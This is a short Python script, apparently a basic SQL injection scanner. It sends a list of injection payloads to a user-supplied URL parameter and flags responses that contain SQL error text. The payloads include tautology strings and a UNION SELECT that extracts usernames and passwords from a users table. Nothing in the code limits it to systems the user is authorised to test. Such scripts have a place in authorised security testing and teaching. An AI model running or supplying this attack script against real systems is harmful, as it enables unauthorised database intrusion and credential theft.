import requests

# List of common SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' UNION SELECT null, username, password FROM users --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 'a'='a' --"
]

def test_sql_injection(url, param):
    print(f"Testing SQL Injection on {url} with parameter {param}...\n")

    for payload in payloads:
        # Construct the vulnerable URL by injecting payload into the parameter
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            
            # Check if the response indicates a successful injection
            if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                print(f"Potential SQL Injection detected! Payload: {payload}")
                print(f"Response: {response.text[:200]}\n")
            else:
                print(f"Tested payload: {payload} (No clear signs of vulnerability)")

        except requests.exceptions.RequestException as e:
            print(f"Error sending request: {e}")
    
    print("\nSQL Injection testing completed.")

# Input the target URL and parameter
target_url = input("Enter the target URL (e.g., http://example.com/search): ")
parameter = input("Enter the vulnerable parameter (e.g., 'id' for http://example.com/search?id=1): ")

# Run SQL injection tests
test_sql_injection(target_url, parameter)
